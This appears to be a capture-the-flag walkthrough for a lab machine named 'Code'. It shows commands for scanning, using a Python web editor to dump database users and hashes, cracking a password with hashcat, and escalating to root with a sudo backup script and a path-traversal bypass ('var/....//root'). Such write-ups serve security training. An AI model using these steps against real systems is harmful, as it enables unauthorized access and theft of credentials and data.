# 💻 Code CTF - Walkthrough

## 🔍 Initial Reconnaissance

I performed a scan with `nmap`:

```bash
nmap -sC -sV -A 10.10.11.62
```

I detected two open ports:

- **🛡️ Port 22** → SSH
- **⚙️ Port 5000** → HTTP (served by Gunicorn)

Accessing the website on port 5000, I found a web interface for a **Python code editor**. I tried a basic code injection but received the message:

```
Use of restricted keywords is not allowed
```

---

## 🔬 Exploring the Python Editor

Using the command:

```python
print(globals())
```

I obtained a list of loaded variables and modules. Among them, I identified a `db` object, a possible database instance.

I verified with:

```python
print(dir(db))
```

Having confirmed the presence of the database, I dumped the users with:

```python
for user in User.query.all():
    print(user.__dict__)
```

✅ I discovered a user named **martin** with a hashed password.

---

## 🔑 Password Cracking

I saved the hash and cracked it using `hashcat`:

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

✅ Password found! I then logged in via SSH:

```bash
ssh martin@10.10.11.62
```

However, the **user flag** was not in the home directory.

---

## 🧍‍♂️ Privilege Escalation to app-program

I noticed another user: **app-program**, but I didn't have permissions to access their home directory.

I checked sudo privileges with:

```bash
sudo -l
```

I discovered that I could execute a **backup** script as `app-program`:

```bash
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### 🔍 Backup Analysis

The backup uses a JSON file as input. Accessing the backup folder, I found a `.tar` archive:

```bash
scp martin@10.10.11.62:backups/code_home_app-production_app_2024_August.tar.bz2
tar -xvjf code_home_app-production_app_2024_August.tar.bz2
```

✅ Inside, I found the **user flag**!

---

## 🚀 Privilege Escalation to Root

The task.json file for the backup only accepts folders under `/var` or `/home`. To access `/root`, I used a malformed path:

```
var/....//root
```

This bypassed the filter that blocked `../`.

I modified task.json, re-executed the backup:

```bash
sudo /usr/bin/backy.sh task.json
```

and downloaded the resulting archive:

```bash
scp martin@10.10.11.62:/backups/code_home_app-production_2025_April.tar.bz2 .
tar -xvjf code_home_app-production_2025_April.tar.bz2
```

✅ Inside, I found the **root flag**!

---

## 🎯 Conclusion

CTF **Code** successfully completed! 🧩

- Access obtained through code injection in the Python editor
- Dumped users from the DB and cracked the password
- Escalation via backup script and JSON manipulation
- User and root flags acquired! 🏁